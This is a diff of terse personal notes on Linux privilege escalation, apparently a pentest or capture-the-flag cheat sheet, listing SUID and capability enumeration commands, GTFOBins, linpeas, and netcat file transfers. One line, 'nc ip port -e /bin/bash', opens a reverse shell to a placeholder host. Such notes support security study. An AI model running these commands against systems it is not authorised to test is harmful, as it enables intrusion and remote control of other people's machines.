@@ -18,6 +18,7 @@
        sudo -l
 
    *suid permission
+      gtfobin website
 
        find / -type f -perm -04000/-u=x/-u+s,-perm -04000/-g=x/-g+s -ls 2>/dev/null
 
@@ -47,14 +48,14 @@
    *capabilities
       getcap -r / 2>/dev/null
 
-      ---file share---
+   *file share
       nc -lvnp 9000<file.txt
       reverse shell : nc ip port>file.txt
       nc -lvnp 9000
       reverse shell : nc ip port -e /bin/bash
-      --file shae
+      
       scp file username@ip /destination folder
       python -m http.server 9000
       wget ip/file
       linpeas
-      website : gtfobin
+      
